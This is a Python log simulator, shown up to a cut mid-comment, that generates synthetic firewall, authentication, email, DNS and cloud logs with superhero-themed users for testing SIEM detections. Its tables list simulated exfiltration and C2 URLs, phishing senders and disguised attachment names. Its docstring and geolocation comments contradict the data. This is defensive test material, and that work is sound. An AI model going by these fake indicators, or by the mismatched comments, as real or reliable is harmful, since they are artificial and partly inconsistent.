#!/usr/bin/env python3
"""
Watchtower Log Simulator
Generates realistic Palo Alto Networks firewall + Linux auth logs populated
with data from 90s/2000s rap artists, labels, and industry figures, and ships
them to sgcia via TCP.

Log formats modeled after:
  - Palo Alto Networks PAN-OS Traffic/Threat/Config/GlobalProtect logs:
      https://docs.paloaltonetworks.com/pan-os/11-1/pan-os-admin/monitoring/use-syslog-for-monitoring/syslog-field-descriptions
  - Linux PAM/sshd: standard RFC 3164 / RFC 5424
  - Apache Combined Log Format: https://httpd.apache.org/docs/current/logs.html
  - Cisco Duo Authentication + Administrator Logs (Admin API v2):
      https://duo.com/docs/adminapi#authentication-logs

Field names for Palo Alto, Windows Event Logs, and Cisco Duo are grounded in
this tenant's own deployed rules (data/extracted.json) rather than the raw
vendor wire format -- see the comments above _panw_event/_win_line/_duo_line.
"""

import os
import json
import random
import socket
import time
import logging
import urllib.request
import urllib.error
import xml.etree.ElementTree as ET
from datetime import datetime, timezone
from typing import Callable

# ─── Configuration ─────────────────────────────────────────────────────────────
SYSLOG_HOST    = os.getenv("SYSLOG_HOST", "localhost")
SYSLOG_PORT    = int(os.getenv("SYSLOG_PORT", "601"))
INTERVAL_MS    = int(os.getenv("LOG_INTERVAL_MS", "1500"))
BURST_SIZE     = int(os.getenv("LOG_BURST", "5"))
SCENARIO_CHANCE = float(os.getenv("SCENARIO_CHANCE", "0.02"))  # prob. a burst is a scripted storyline
HOSTNAME_SELF  = "nexus-sim-01"

# Duo admin-console actions (policy/group/secret-key changes) are meant to
# page a SOC a couple times a day, not constantly -- see the GENERATORS
# comment for why this can't be expressed as a pool weight. Chance is
# computed per-tick from a fixed daily target, so it stays correct even if
# LOG_INTERVAL_MS changes.
DUO_ADMIN_PER_DAY = float(os.getenv("DUO_ADMIN_PER_DAY", "2.5"))
TICKS_PER_DAY = 86400_000 / INTERVAL_MS
DUO_ADMIN_CHANCE = DUO_ADMIN_PER_DAY / TICKS_PER_DAY

# SentinelOne EDR events bypass sgcia/DataPipeline entirely and post
# straight into SDL -- real EDR telemetry never flows through a customer's
# DataPipeline HEC pipeline either; the agent reports directly to the S1
# backend. Reuses the same SDL_WRITE_TOKEN already configured for FoundStone.
SDL_BASE_URL    = os.getenv("SDL_BASE_URL", "").rstrip("/")
SDL_WRITE_TOKEN = os.getenv("SDL_WRITE_TOKEN", "")

logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
log = logging.getLogger(__name__)

# ─── Marvel/DC Universe Data ───────────────────────────────────────────────

# Operative roster spanning Marvel, DC, Watchmen, and The Boys — civilian
# identities paired with their superhero/villain alter egos (mirrors Bourne's
# david.webb -> jason.bourne mechanic). `clearance` = home faction. Email
# domain is keyed by faction universe: @starkindustries.com (Marvel),
# @waynetech.com (DC), @lexcorp.com (Watchmen, Vought, The Boys).
OPERATIVES = [
    # ── Avengers (Marvel) ──
    {"name": "tony.stark",       "alias": "iron.man",           "uid": 1001, "clearance": "AVENGERS"},
    {"name": "steve.rogers",     "alias": "captain.america",    "uid": 1002, "clearance": "AVENGERS"},
    {"name": "natasha.romanoff", "alias": "black.widow",        "uid": 1003, "clearance": "AVENGERS"},
    {"name": "bruce.banner",     "alias": "the.hulk",           "uid": 1004, "clearance": "AVENGERS"},
    {"name": "clint.barton",     "alias": "hawkeye",            "uid": 1005, "clearance": "AVENGERS"},
    {"name": "wanda.maximoff",   "alias": "scarlet.witch",      "uid": 1006, "clearance": "AVENGERS"},
    {"name": "sam.wilson",       "alias": "the.falcon",         "uid": 1007, "clearance": "AVENGERS"},
    {"name": "carol.danvers",    "alias": "captain.marvel",     "uid": 1008, "clearance": "AVENGERS"},
    {"name": "peter.parker",     "alias": "spider.man",         "uid": 1009, "clearance": "AVENGERS"},
    {"name": "pepper.potts",     "alias": "pepper.potts",       "uid": 1082, "clearance": "AVENGERS"},
    # ── S.H.I.E.L.D. (Marvel) ──
    {"name": "phil.coulson",     "alias": "coulson",            "uid": 1010, "clearance": "S.H.I.E.L.D."},
    {"name": "james.rhodes",     "alias": "war.machine",        "uid": 1011, "clearance": "S.H.I.E.L.D."},
    {"name": "daisy.johnson",    "alias": "quake",              "uid": 1012, "clearance": "S.H.I.E.L.D."},
    {"name": "grant.ward",       "alias": "agent.ward",         "uid": 1013, "clearance": "S.H.I.E.L.D."},
    {"name": "nicholas.fury",    "alias": "fury",               "uid": 1083, "clearance": "S.H.I.E.L.D."},
    {"name": "maria.hill",       "alias": "maria.hill",         "uid": 1084, "clearance": "S.H.I.E.L.D."},
    # ── Justice League (DC) ──
    {"name": "bruce.wayne",      "alias": "batman",             "uid": 1014, "clearance": "JUSTICE-LEAGUE"},
    {"name": "clark.kent",       "alias": "superman",           "uid": 1015, "clearance": "JUSTICE-LEAGUE"},
    {"name": "diana.prince",     "alias": "wonder.woman",       "uid": 1016, "clearance": "JUSTICE-LEAGUE"},
    {"name": "barry.allen",      "alias": "the.flash",          "uid": 1017, "clearance": "JUSTICE-LEAGUE"},
    {"name": "arthur.curry",     "alias": "aquaman",            "uid": 1018, "clearance": "JUSTICE-LEAGUE"},
    {"name": "jonn.jonzz",       "alias": "martian.manhunter",  "uid": 1019, "clearance": "JUSTICE-LEAGUE"},
    {"name": "lucius.fox",       "alias": "lucius.fox",         "uid": 1085, "clearance": "JUSTICE-LEAGUE"},
    # ── X-Men (Marvel) — solo-op cover identities ──
    {"name": "charles.xavier",   "alias": "professor.x",        "uid": 1020, "clearance": "X-MEN"},
    {"name": "logan.howlett",    "alias": "wolverine",          "uid": 1021, "clearance": "X-MEN"},
    {"name": "logan.howlett",    "alias": "weapon.x",           "uid": 1021, "clearance": "X-MEN"},
    {"name": "scott.summers",    "alias": "cyclops",            "uid": 1022, "clearance": "X-MEN"},
    {"name": "ororo.munroe",     "alias": "storm",              "uid": 1023, "clearance": "X-MEN"},
    {"name": "hank.mccoy",       "alias": "beast",              "uid": 1024, "clearance": "X-MEN"},
    {"name": "jean.grey",        "alias": "phoenix",            "uid": 1025, "clearance": "X-MEN"},
    {"name": "jean.grey",        "alias": "marvel.girl",        "uid": 1025, "clearance": "X-MEN"},
    # ── Wakanda (Marvel) ──
    {"name": "tchalla.udaku",    "alias": "black.panther",      "uid": 1026, "clearance": "WAKANDA"},
    {"name": "shuri.udaku",      "alias": "shuri",              "uid": 1027, "clearance": "WAKANDA"},
    {"name": "erik.killmonger",  "alias": "killmonger",         "uid": 1028, "clearance": "WAKANDA"},
    {"name": "ramonda.udaku",    "alias": "ramonda",            "uid": 1029, "clearance": "WAKANDA"},
    # ── Gotham Rogue (DC) — underground street ops ──
    {"name": "harley.quinn",     "alias": "harley.quinn",       "uid": 1030, "clearance": "GOTHAM-ROGUE"},
    {"name": "harley.quinn",     "alias": "harleen.quinzel",    "uid": 1030, "clearance": "GOTHAM-ROGUE"},
    {"name": "pamela.isley",     "alias": "poison.ivy",         "uid": 1031, "clearance": "GOTHAM-ROGUE"},
    {"name": "jonathan.crane",   "alias": "scarecrow",          "uid": 1032, "clearance": "GOTHAM-ROGUE"},
    # ── Asgard (Marvel) ──
    {"name": "thor.odinson",     "alias": "thor",               "uid": 1033, "clearance": "ASGARD"},
    {"name": "loki.laufeyson",   "alias": "loki",               "uid": 1034, "clearance": "ASGARD"},
    {"name": "sif.sif",          "alias": "sif",                "uid": 1035, "clearance": "ASGARD"},
    {"name": "heimdall.heimdall","alias": "heimdall",           "uid": 1036, "clearance": "ASGARD"},
    {"name": "volstagg.volstagg","alias": "volstagg",           "uid": 1037, "clearance": "ASGARD"},
    # ── Guardians of the Galaxy (Marvel) ──
    {"name": "peter.quill",      "alias": "star.lord",          "uid": 1038, "clearance": "GUARDIANS"},
    {"name": "gamora.zen",       "alias": "gamora",             "uid": 1039, "clearance": "GUARDIANS"},
    {"name": "rocket.raccoon",   "alias": "rocket",             "uid": 1040, "clearance": "GUARDIANS"},
    {"name": "drax.destroyer",   "alias": "drax",               "uid": 1041, "clearance": "GUARDIANS"},
    {"name": "groot.groot",      "alias": "groot",              "uid": 1042, "clearance": "GUARDIANS"},
    {"name": "mantis.mantis",    "alias": "mantis",             "uid": 1043, "clearance": "GUARDIANS"},
    {"name": "nebula.azarath",   "alias": "nebula",             "uid": 1044, "clearance": "GUARDIANS"},
    {"name": "adam.warlock",     "alias": "adam.warlock",       "uid": 1045, "clearance": "GUARDIANS"},
    {"name": "yondu.udonta",     "alias": "yondu",              "uid": 1046, "clearance": "GUARDIANS"},
    {"name": "kraglin.obfonteri","alias": "kraglin",            "uid": 1047, "clearance": "GUARDIANS"},
    {"name": "stakar.ogord",     "alias": "stakar",             "uid": 1048, "clearance": "GUARDIANS"},
    {"name": "michelle.omega",   "alias": "michelle",           "uid": 1049, "clearance": "GUARDIANS"},
    {"name": "martinex.zt",      "alias": "martinex",           "uid": 1050, "clearance": "GUARDIANS"},
    # ── Legion of Doom (DC) ──
    {"name": "lex.luthor",       "alias": "lex.luthor",         "uid": 1051, "clearance": "LEGION-OF-DOOM"},
    {"name": "brainiac.brainiac","alias": "brainiac",           "uid": 1052, "clearance": "LEGION-OF-DOOM"},
    {"name": "darkseid.darkseid","alias": "darkseid",           "uid": 1053, "clearance": "LEGION-OF-DOOM"},
    {"name": "grodd.king",       "alias": "grodd",              "uid": 1054, "clearance": "LEGION-OF-DOOM"},
    # ── Suicide Squad (DC) ──
    {"name": "floyd.lawton",     "alias": "deadshot",           "uid": 1055, "clearance": "SUICIDE-SQUAD"},
    {"name": "rick.flag",        "alias": "flag",               "uid": 1056, "clearance": "SUICIDE-SQUAD"},
    {"name": "amanda.waller",    "alias": "the.wall",           "uid": 1064, "clearance": "SUICIDE-SQUAD"},
    # ── HYDRA (Marvel) ──
    {"name": "bucky.barnes",     "alias": "winter.soldier",     "uid": 1057, "clearance": "HYDRA"},
    # ── Brotherhood of Mutants (Marvel) ──
    {"name": "erik.lehnsherr",   "alias": "magneto",            "uid": 1058, "clearance": "BROTHERHOOD"},
    {"name": "rogue.rogue",      "alias": "rogue",              "uid": 1059, "clearance": "BROTHERHOOD"},
    {"name": "mystique.mystique", "alias": "mystique",           "uid": 1060, "clearance": "BROTHERHOOD"},
    {"name": "cain.marko",       "alias": "juggernaut",         "uid": 1061, "clearance": "BROTHERHOOD"},
    # ── Watchmen — audit/oversight layer ("who watches the watchmen") ──
    {"name": "walter.kovacs",    "alias": "rorschach",          "uid": 1062, "clearance": "WATCHMEN"},
    {"name": "jon.osterman",     "alias": "doctor.manhattan",   "uid": 1063, "clearance": "WATCHMEN"},
    {"name": "adrian.veidt",     "alias": "ozymandias",         "uid": 1086, "clearance": "WATCHMEN"},
    {"name": "dan.dreiberg",     "alias": "nite.owl",           "uid": 1087, "clearance": "WATCHMEN"},
    {"name": "laurie.juspeczyk", "alias": "silk.spectre",       "uid": 1088, "clearance": "WATCHMEN"},
    # ── Vought International (The Boys) — corporate-controlled supes ──
    {"name": "john.gillman",     "alias": "homelander",         "uid": 1089, "clearance": "VOUGHT"},
    {"name": "annie.january",    "alias": "starlight",          "uid": 1090, "clearance": "VOUGHT"},
    {"name": "kevin.moskowitz",  "alias": "the.deep",           "uid": 1091, "clearance": "VOUGHT"},
    {"name": "maggie.shaw",      "alias": "queen.maeve",        "uid": 1092, "clearance": "VOUGHT"},
    {"name": "reggie.franklin",  "alias": "a.train",            "uid": 1093, "clearance": "VOUGHT"},
    {"name": "unknown.identity", "alias": "black.noir",         "uid": 1094, "clearance": "VOUGHT"},
    # ── The Boys — vigilante insiders opposing Vought ──
    {"name": "billy.butcher",    "alias": "butcher",            "uid": 1095, "clearance": "THE-BOYS"},
    {"name": "hughie.campbell",  "alias": "hughie",             "uid": 1096, "clearance": "THE-BOYS"},
    {"name": "marvin.milk",      "alias": "mothers.milk",       "uid": 1097, "clearance": "THE-BOYS"},
    {"name": "serge.cochon",     "alias": "frenchie",           "uid": 1098, "clearance": "THE-BOYS"},
    {"name": "kimiko.miyashiro", "alias": "the.female",         "uid": 1099, "clearance": "THE-BOYS"},
    # -- Teen Titans (DC) --
    {"name": "dick.grayson",     "alias": "robin",              "uid": 1067, "clearance": "TEEN-TITANS"},
    {"name": "kory.anders",      "alias": "starfire",           "uid": 1068, "clearance": "TEEN-TITANS"},
    {"name": "raven.roth",       "alias": "raven",              "uid": 1069, "clearance": "TEEN-TITANS"},
    {"name": "victor.stone",     "alias": "cyborg",             "uid": 1070, "clearance": "TEEN-TITANS"},
    {"name": "garfield.logan",   "alias": "beast.boy",          "uid": 1071, "clearance": "TEEN-TITANS"},
    # -- Doom Patrol (DC) --
    {"name": "clifford.steele",  "alias": "robotman",           "uid": 1072, "clearance": "DOOM-PATROL"},
    {"name": "rita.farr",        "alias": "elasti.woman",       "uid": 1073, "clearance": "DOOM-PATROL"},
    {"name": "larry.trainor",    "alias": "negative.man",       "uid": 1074, "clearance": "DOOM-PATROL"},
    {"name": "kay.challis",      "alias": "crazy.jane",         "uid": 1075, "clearance": "DOOM-PATROL"},
    # -- Green Lantern Corps (DC) --
    {"name": "hal.jordan",       "alias": "green.lantern",      "uid": 1076, "clearance": "GREEN-LANTERNS"},
    {"name": "hal.jordan",       "alias": "emerald.knight",     "uid": 1076, "clearance": "GREEN-LANTERNS"},
    {"name": "kyle.rayner",      "alias": "ion",                "uid": 1077, "clearance": "GREEN-LANTERNS"},
    {"name": "kyle.rayner",      "alias": "torchbearer",        "uid": 1077, "clearance": "GREEN-LANTERNS"},
    {"name": "john.stewart",     "alias": "green.lantern",      "uid": 1078, "clearance": "GREEN-LANTERNS"},
    {"name": "guy.gardner",      "alias": "warrior",            "uid": 1079, "clearance": "GREEN-LANTERNS"},
    {"name": "jessica.cruz",     "alias": "power.ring",         "uid": 1080, "clearance": "GREEN-LANTERNS"},
    {"name": "simon.baz",        "alias": "green.lantern",      "uid": 1081, "clearance": "GREEN-LANTERNS"},
]

# Email domain mapping by faction/universe
MARVEL_FACTIONS = {"AVENGERS", "S.H.I.E.L.D.", "X-MEN", "WAKANDA", "ASGARD", "GUARDIANS", "HYDRA", "BROTHERHOOD"}
DC_FACTIONS = {"JUSTICE-LEAGUE", "GOTHAM-ROGUE", "LEGION-OF-DOOM", "SUICIDE-SQUAD", "TEEN-TITANS", "DOOM-PATROL", "GREEN-LANTERNS"}
# WATCHMEN and Vought/The Boys are neither Marvel nor DC -- they route
# through the shared LexCorp back-office domain like the old OVERSIGHT layer.

def email_domain(clearance: str) -> str:
    if clearance in MARVEL_FACTIONS:
        return "starkindustries.com"
    elif clearance in DC_FACTIONS:
        return "waynetech.com"
    else:  # WATCHMEN, VOUGHT, THE-BOYS
        return "lexcorp.com"

# LexCorp Inc. internal network hosts — the shared financial/legal/infrastructure
# back-office behind all factions (mirrors how CIA/Langley sat behind Treadstone).
INTERNAL_HOSTS = [
    # LexCorp Inc. core (shared finance/legal/infra backbone)
    "nexus-core-fw01.lexcorp.com",
    "nexus-core-dc01.lexcorp.com",
    "nexus-core-vpn01.lexcorp.com",
    "avengers-db01.lexcorp.com",
    "jleague-proxy01.lexcorp.com",
    "xmen-ctrl01.lexcorp.com",
    "wakanda-ctrl01.lexcorp.com",
    "ops-dmz-gw01.lexcorp.com",
    "noc-ids01.lexcorp.com",
    # Justice League Gotham HQ
    "jleague-gotham-hq01.lexcorp.com",
    # Regional faction hubs
    "station-metropolis-01.lexcorp.com",
    "station-longbeach-01.lexcorp.com",
    "station-lasvegas-01.lexcorp.com",
    "station-oa-01.lexcorp.com",
    "station-gotham-01.lexcorp.com",
    "station-stark-tower-01.lexcorp.com",
    "station-new-asgard-01.lexcorp.com",
    "station-wakanda-01.lexcorp.com",
    "station-wyandanch-01.lexcorp.com",
    # X-Men individually-run solo-op side infra
    "soloop-wolverine-01.lexcorp.com",
    "soloop-gambit-01.lexcorp.com",
    "soloop-storm-01.lexcorp.com",
    "soloop-phoenix-01.lexcorp.com",
    "soloop-beast-01.lexcorp.com",
    "soloop-bishop-01.lexcorp.com",
    # Expanded footprint — Guardians + independent-faction infra
    "station-deerpark-01.lexcorp.com",
    "station-uniondale-01.lexcorp.com",
    "station-rooseveltfreeport-01.lexcorp.com",
    "wakanda-hq01.lexcorp.com",
    "jleague-audit01.lexcorp.com",
    "hydra-annex01.lexcorp.com",
    "doom-vendor01.lexcorp.com",
    "lexcorp-annex02.lexcorp.com",
    # Southern faction + other-regions outposts
    "station-belle-reve-01.lexcorp.com",
    "squad-hq01.lexcorp.com",
    "station-detroit-01.lexcorp.com",
    "station-atlanta-01.lexcorp.com",
    "station-houston-01.lexcorp.com",
    "outpost-detroit-mi.lexcorp.com",
    "station-cleveland-01.lexcorp.com",
    "station-memphis-01.lexcorp.com",
]

# External / rival-network IPs (plausible fiction — RFC 5737 test ranges + routable)
EXTERNAL_IPS = [
    "96.8.124.201",    # "Metropolis — Avengers outbound relay"
    "70.161.29.44",    # "Long Beach — Guardians bridge node"
    "64.124.201.9",    # "Las Vegas — multiverse travel-anomaly correlation"
    "24.185.12.60",    # "NYC — Justice League rival-network beacon"
    "173.245.10.88",   # "Oa — Green Lantern solo-op relay"
    "68.202.14.55",    # "Gotham — Gotham-Rogue proxy"
    "173.15.88.20",    # "New Asgard — Asgard relay"
    "185.220.101.45",  # "Tor exit — unattributed"
    "203.0.113.77",    # TEST-NET (safe for simulation per RFC 5737)
    "198.51.100.23",   # TEST-NET
    "192.0.2.145",     # TEST-NET
    "99.203.14.60",    # "New Asgard — Guardians dead-drop node"
    "142.11.209.40",   # "Wakanda — Wakanda comms"
    "68.174.10.55",    # "Wyandanch — X-Men relay"
    "24.98.10.201",    # "Deer Park — Green Lantern node"
    "96.57.23.190",    # "Uniondale — X-Men relay"
    "142.254.10.88",   # "Roosevelt/Freeport — S.H.I.E.L.D. watchdog egress"
    "70.121.55.33",    # "Belle Reve — Legion of Doom vendor node"
    "173.174.10.201",  # "Belle Reve — Suicide Squad rival relay"
    "23.243.10.90",    # "Detroit — HYDRA bridge relay"
    "76.191.20.55",    # "Cleveland — Teen Titans regional node"
    "70.152.10.88",    # "Memphis — Doom Patrol regional node"
    "24.116.10.201",   # "Atlanta — Brotherhood regional node"
    "70.112.10.55",    # "Houston — Brotherhood regional node"
    "99.44.10.201",    # "Miami — industry finance corridor"
]

INTERNAL_IPS = [
    "10.0.1.10", "10.0.1.11", "10.0.2.20", "10.0.2.21",
    "10.1.0.50", "10.1.0.51", "10.2.5.100", "172.16.10.5",
    "172.16.10.6", "172.20.0.1", "192.168.10.15", "192.168.10.16",
    "10.6.5.100", "10.7.5.100", "10.8.5.100", "10.9.5.100",
    "10.10.5.100", "10.11.5.100", "10.12.5.100",
]

# Geolocation for each external IP — used by Cisco Duo's access_device.location
# block. Watchtower roster's home cities/regions.
IP_GEO = {
    "96.8.124.201":   {"city": "Compton",     "state": "California",  "country": "United States"},
    "70.161.29.44":   {"city": "Long Beach",  "state": "California",  "country": "United States"},
    "64.124.201.9":   {"city": "Las Vegas",   "state": "Nevada",      "country": "United States"},
    "24.185.12.60":   {"city": "New York",    "state": "New York",    "country": "United States"},
    "173.245.10.88":  {"city": "Staten Island","state": "New York",   "country": "United States"},
    "68.202.14.55":   {"city": "Queens",      "state": "New York",    "country": "United States"},
    "173.15.88.20":   {"city": "St. Albans",  "state": "New York",    "country": "United States"},
    "185.220.101.45": {"city": "Unknown",     "state": "Unknown",     "country": "Unknown"},
    "99.203.14.60":   {"city": "Amityville",  "state": "New York",    "country": "United States"},
    "142.11.209.40":  {"city": "Brentwood",   "state": "New York",    "country": "United States"},
    "68.174.10.55":   {"city": "Wyandanch",   "state": "New York",    "country": "United States"},
    "24.98.10.201":   {"city": "Deer Park",   "state": "New York",    "country": "United States"},
    "96.57.23.190":   {"city": "Uniondale",   "state": "New York",    "country": "United States"},
    "142.254.10.88":  {"city": "Freeport",    "state": "New York",    "country": "United States"},
    "70.121.55.33":   {"city": "New Orleans", "state": "Louisiana",   "country": "United States"},
    "173.174.10.201": {"city": "New Orleans", "state": "Louisiana",   "country": "United States"},
    "23.243.10.90":   {"city": "Detroit",     "state": "Michigan",    "country": "United States"},
    "76.191.20.55":   {"city": "Cleveland",   "state": "Ohio",        "country": "United States"},
    "70.152.10.88":   {"city": "Memphis",     "state": "Tennessee",   "country": "United States"},
    "24.116.10.201":  {"city": "Atlanta",     "state": "Georgia",     "country": "United States"},
    "70.112.10.55":   {"city": "Houston",     "state": "Texas",       "country": "United States"},
    "99.44.10.201":   {"city": "Miami",       "state": "Florida",     "country": "United States"},
    "203.0.113.77":   {"city": "Unknown",     "state": "Unknown",     "country": "Unknown"},
    "198.51.100.23":  {"city": "Unknown",     "state": "Unknown",     "country": "Unknown"},
    "192.0.2.145":    {"city": "Unknown",     "state": "Unknown",     "country": "Unknown"},
}

# Cisco Duo protected applications (themed)
DUO_APPLICATIONS = [
    "LexCorp Inc. VPN",
    "Avengers Power Registry Portal",
    "Avengers Cosmic Vault Console",
    "Justice League Financial Audit Console",
    "X-Men Solo Ops Comms",
    "Wakanda Infra Admin Portal",
    "HYDRA Admin Portal",
    "Gemeinschaft Bank Portal",
    "Operative Roster Tracker (CONFIDENTIAL)",
    "LexCorp Inc. AnyConnect",
    "Facility RDP Gateway",
    "Access Termination Request System",
    "Justice League Cyber Ops Console",
    "Insider Leak Review Portal",
    "Legion of Doom Distribution VPN",
    "Asgard Federation Portal",
    "Avengers Archive Access",
    "Suicide Squad Distribution Portal",
    "Legal Hold Review Portal",
    "Cross-Faction Audit Console",
]

# Duo Authentication Proxy hosts that emit the logs
DUO_PROXIES = [
    "gl-auth-proxy01.lexcorp.com",
    "gl-auth-proxy02.lexcorp.com",
]

# Duo Administrator log events (a second, real Duo log type this tenant's
# rules also reference via unmapped.eventtype=administrator -- distinct from
# the authentication events above). (action, description, severity) grounded
# in this tenant's own deployed Duo rules.
DUO_ADMIN_ACTIONS = [
    ("admin_login_error", "Invalid password attempt", 4),
    ("integration_skey_view", "Integration secret key viewed", 6),
    ("admin_send_reset_password_email", "Password reset email sent", 6),
    ("policy_delete", "MFA policy deleted", 5),
    ("group_create", "Group configuration created", 6),
    ("hardtoken_create", "Hardware token assigned to user", 6),
    ("bypass_create", "Bypass code created by administrator", 5),
    ("admin_single_sign_on_cert_update", "SSO certificate updated", 6),
    ("ldap_directory_conn_create", "LDAP directory connection created", 6),
    ("user_restore", "User account restored", 6),
]
# Watchmen — the audit/oversight layer with legitimate admin-console access
# ("who watches the watchmen").
DUO_ADMINS = ["walter.kovacs", "jon.osterman", "adrian.veidt", "dan.dreiberg"]

# Squid web-proxy hosts (outbound egress gateways)
WEB_PROXIES = [
    "web-proxy01.lexcorp.com",
    "web-proxy02.lexcorp.com",
    "jleague-proxy01.lexcorp.com",
    "soloop-wolverine-01.lexcorp.com",
]

# Egress destinations: (url, peer_ip, content_type). All fake domains use
# RFC 2606 reserved TLDs / example.* so nothing resolves to a real host.
EGRESS_BENIGN = [
    ("http://archive.ubuntu.com/ubuntu/dists/jammy/InRelease", "91.189.91.39",  "text/plain"),
    ("https://login.microsoftonline.com/common/oauth2/token",  "20.190.160.14", "application/json"),
    ("https://www.reuters.com/world/europe/",                  "104.16.118.45", "text/html"),
    ("https://cdn.jsdelivr.net/npm/chart.js",                  "151.101.1.229", "application/javascript"),
    ("https://update.googleapis.com/service/update2",          "142.250.80.110","application/octet-stream"),
    ("https://www.bbc.co.uk/news",                             "151.101.0.81",  "text/html"),
]

EGRESS_SUSPICIOUS = [
    ("http://exfil-relay.example.com/upload",                  "70.121.55.33",  "application/octet-stream"),
    ("https://cosmicvault-leak.example.net/drop",               "23.243.10.90",  "application/octet-stream"),
    ("https://pastebin.example.org/raw/8x9QzKdW",              "185.220.101.45","text/plain"),
    ("http://c2.hydra.example.net/q?id=8812",                  "24.185.12.60",  "application/json"),
    ("https://filebin.example.org/nexus-registry-full.enc",    "70.152.10.88",  "application/octet-stream"),
    ("http://203.0.113.77/beacon",                             "203.0.113.77",  "text/plain"),
    # Loki / S.H.I.E.L.D. — the real, well-documented insider defection
    ("https://securedrop.example.net/insider/8812",            "24.116.10.201", "application/octet-stream"),
    # Cosmic Cube Vault Exfiltration — unreleased Thanos exfil pulled from S3
    ("https://api.cosmicvault.example.com/v1/export",          "96.8.124.201",  "application/json"),
    # Wakanda Independent Infra Standup — probed by a rival faction network
    ("https://recon.wakanda-probe.example.net/scan",            "68.202.14.55",  "application/octet-stream"),
    # Asgard Trust Pact — excessive cross-faction alliance trust relationship
    ("https://alliance-trust.example.org/exchange",             "173.15.88.20",  "application/json"),
]

# ── DNS (ISC BIND query log) ──
DNS_RESOLVERS = ["10.0.0.53", "10.0.0.54"]
DNS_BENIGN = [
    ("www.bbc.co.uk", "A"), ("update.googleapis.com", "A"),
    ("archive.ubuntu.com", "A"), ("login.microsoftonline.com", "A"),
    ("outlook.office365.com", "A"), ("time.windows.com", "A"),
    ("cdn.jsdelivr.net", "AAAA"), ("www.reuters.com", "A"),
]
DNS_SUSPICIOUS = [
    ("exfil-relay.example.com", "A"),         ("cosmicvault-leak.example.net", "A"),
    ("c2.hydra.example.net", "TXT"),          ("c2.doom.example.net", "TXT"),
    ("beacon.soloop.example.net", "TXT"),     ("alliance-trust.example.net", "A"),
    ("recon.wakanda-probe.example.net", "A"), ("c2.southern.example.net", "TXT"),
]

# ── Mimecast (email security gateway) ──
# Real category values + action set grounded in this tenant's own deployed
# Mimecast-sourced rules (data/extracted.json): unmapped.category
# (phish/Malware/Anonymizers/Compromised/Botnets/Peer-to-Peer/Dangerous file
# extension), unmapped.action/actions/adminOverride (hold/block/bounce),
# actor.invoked_by (Entry Scan/User Click), status_detail (malicious),
# event.type (TTP Attachment/Impersonation Protection).
MIMECAST_MALICIOUS_CATEGORIES = [
    "phish", "Malware", "Anonymizers", "Compromised", "Peer-to-Peer",
]
MIMECAST_BLOCK_ACTIONS = ["hold", "block", "bounce"]
PHISH_SENDERS = [
    ("IT Security Team",      "security@nexus-core.example.com"),
    ("LexCorp Legal",         "legal-notice@lexcorp-review.example.net"),
    ("DocuSign",              "no-reply@docusign-secure.example.com"),
    ("Administrator",         "admin@secure-ops.example.org"),
    ("Microsoft 365",         "account@ms-office-secure.example.com"),
]
PHISH_ATTACHMENTS = [
    "power-registry-export.xls.exe", "cosmic-vault-briefing.pdf.scr",
    "operative-contract.docm", "mission_detail_2024.html", "secure-brief.htm",
]
MIMECAST_BENIGN_SENDERS = [
    ("LexCorp Inc. IT",  "it-notifications@lexcorp.com"),
    ("DocuSign",    "no-reply@docusign.com"),
    ("Zoom",        "no-reply@zoom.us"),
    ("GitHub",      "notifications@github.com"),
]
MIMECAST_BENIGN_SUBJECTS = [
    "Your weekly digest", "Meeting invite: Ops sync", "Signature requested",
    "Security patch notification", "PR review requested",
]

# ── PostgreSQL pgAudit (LexCorp Inc. financial/royalty DB) ──
DB_NAME = "nexus_registry"
DB_OBJECTS = [
    "public.power_registry", "public.cosmic_vault", "public.operative_assignments",
    "public.faction_agreements", "public.wire_transfers", "public.cover_aliases",
    "public.insider_watchlist",
]

# ── Windows Security Event log (NEXUS.LOCAL domain) ──
WIN_HOSTS = [
    "NEXUS-CORE-DC01", "AVENGERS-DB01", "WAKANDA-CTRL01",
    "XMEN-CTRL01", "JLEAGUE-GOTHAM-HQ01", "OPS-DMZ-GW01",
]
WIN_LOGON_TYPES = {2: "Interactive", 3: "Network", 10: "RemoteInteractive"}
WIN_FAIL_STATUS = [
    ("0xC000006D", "0xC0000064", "user name does not exist"),
    ("0xC000006D", "0xC000006A", "bad password"),
    ("0xC0000234", "0x0",        "account locked out"),
    ("0xC0000072", "0x0",        "account disabled"),
]

# ── AWS CloudTrail ──────────────────────────────────────────────────────────
#
# Modeled as a hardened AWS Organization, one account per faction.
# Ambient traffic reflects security best practice on purpose: STS AssumeRole
# only (no long-lived access keys, no root usage), MFA-enforced console
# logins, encrypted S3 (SSE-KMS), least-privilege roles, and calls only ever
# originating from known corporate egress IPs. Root usage, MFA-less logins,
# disabled logging, and privilege escalation are deliberately NEVER emitted
# by the ambient generator below -- they only appear inside the dedicated
# attack scenarios (sc_cosmic_cube_heist_thanos, sc_oscorp_privesc),
# so a detection firing on them means something actually happened.
AWS_ACCOUNTS = {
    "AVENGERS":     "778812340091",
    "JUSTICE-LEAGUE": "778812340092",
    "X-MEN":        "778812340093",
    "WAKANDA":      "778812340094",
}
AWS_REGIONS = ["us-east-1", "eu-central-1", "ap-northeast-2"]
AWS_ROLES = {
    "AVENGERS":     "avengers-ops-readonly",
    "JUSTICE-LEAGUE": "jleague-financial-analyst",
    "X-MEN":        "xmen-soloadmin-readonly",
    "WAKANDA":      "wakanda-infra-readonly",
}
AWS_S3_BUCKETS = {
    "AVENGERS":     "avengers-cosmic-vault-enc",
    "JUSTICE-LEAGUE": "jleague-financial-archive-enc",
    "X-MEN":        "xmen-soloop-data-enc",
    "WAKANDA":      "wakanda-infra-data-enc",
}
# Corporate egress ranges -- benign CloudTrail calls always originate here.
# Only compromise scenarios show a foreign/public source IP.
AWS_TRUSTED_SOURCE_IPS = ["10.0.1.10", "10.0.2.20", "10.1.0.50", "10.2.5.100"]

# ── SentinelOne native EDR telemetry ────────────────────────────────────────
#
# Schema grounded in this tenant's OWN deployed detection library
# (data/extracted.json) rather than guessed: field names (event.type,
# src.process.*/tgt.process.*, endpoint.os, cmdScript.content,
# registry.keyPath, event.dns.request, task.path, module.path) and the
# event.type distribution (Process Creation is overwhelmingly dominant) were
# pulled directly from the 746 real SentinelOne-sourced rules in this tenant.
#
# Same secure-by-default philosophy as AWS: ambient traffic is signed,
# known-publisher, ordinary parent/child process trees. LOLBins, credential
# dumping, reverse shells, unsigned binaries, and persistence mechanisms are
# deliberately NEVER ambient -- they only appear in the dedicated EDR attack
